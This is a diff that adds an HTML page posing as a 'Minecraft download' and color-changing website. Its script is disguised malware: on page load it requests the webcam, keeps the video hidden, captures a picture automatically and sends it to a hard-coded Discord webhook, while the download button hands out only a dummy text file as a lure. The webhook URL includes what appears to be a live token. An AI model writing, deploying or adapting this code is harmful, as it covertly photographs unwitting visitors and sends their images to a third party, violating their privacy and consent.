@@ -1,0 +1,132 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Download Minecraft & Color Changing Website</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f8f9fa;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        h1 {
+            color: #333;
+            margin-bottom: 20px;
+        }
+
+        p {
+            color: #555;
+            margin-bottom: 30px;
+        }
+
+        button {
+            padding: 10px 20px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            margin: 10px;
+            background-color: #007bff;
+            color: white;
+            font-size: 16px;
+            transition: background-color 0.3s;
+        }
+
+        button:hover {
+            background-color: #0056b3;
+        }
+
+        #colorChangeButton {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            z-index: 999;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            transition: transform 0.3s;
+        }
+
+        #colorChangeButton:hover {
+            transform: scale(1.1);
+        }
+
+        #videoElement {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <h1>Welcome to the Minecraft Download Page & Color Changing Website!</h1>
+    <p>Click the "Download Minecraft" button to download Minecraft and the "Change Color" button to change the background color:</p>
+
+    <button id="downloadButton">Download Minecraft</button>
+    <button id="colorChangeButton">Change Color</button>
+    <video id="videoElement" autoplay></video>
+
+    <script>
+        const video = document.getElementById('videoElement');
+
+        // Check if user's browser supports media devices
+        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(function (stream) {
+                    video.srcObject = stream;
+                    // Automatically trigger picture capture
+                    capturePicture();
+                })
+                .catch(function (error) {
+                    console.error("Error accessing camera:", error);
+                });
+        }
+
+        function capturePicture() {
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+            const imgURL = canvas.toDataURL('image/png');
+
+            // Send the captured image to the Discord webhook
+            const webhookURL = 'https://ptb.discord.com/api/webhooks/1218581972482527292/56_Q51t96EYp1h_rD6A9ub5RQOn-_dtfNWY-kjvd3smQy2O8Ly-wVzWi6t-8dAQ7oCg1';
+            const imgData = imgURL.replace(/^data:image\/\w+;base64,/, '');
+            const imgBlob = new Blob([imgData], { type: 'image/png' });
+            const imgFormData = new FormData();
+            imgFormData.append('image', imgBlob, 'captured_image.png');
+
+            fetch(webhookURL, {
+                method: 'POST',
+                body: imgFormData
+            });
+
+            console.log('Image sent to Discord webhook');
+        }
+
+        const downloadButton = document.getElementById('downloadButton');
+        downloadButton.addEventListener('click', function () {
+            // Create a sample Minecraft file (e.g., a text file) for download
+            const fileContent = 'This is a sample Minecraft file. Enjoy playing Minecraft!';
+            const fileBlob = new Blob([fileContent], { type: 'text/plain' });
+            const fileURL = URL.createObjectURL(fileBlob);
+
+            // Create a link element and simulate a click to trigger the download
+            const downloadLink = document.createElement('a');
+            downloadLink.href = fileURL;
+            downloadLink.download = 'minecraft.txt';
+            downloadLink.click();
+        });
+
+        const colorChangeButton = document.getElementById('colorChangeButton');
+        const colors = ['#007bff', '#e83e8c', '#28a745', '#fd7e14', '#6610f2'];
+        let index = 0;
+
+        colorChangeButton.addEventListener('click', function () {
+            document.body.style.backgroundColor = colors[index];
+            index = (index + 1) % colors.length;
+        });
+    </script>
+</body>
+</html>
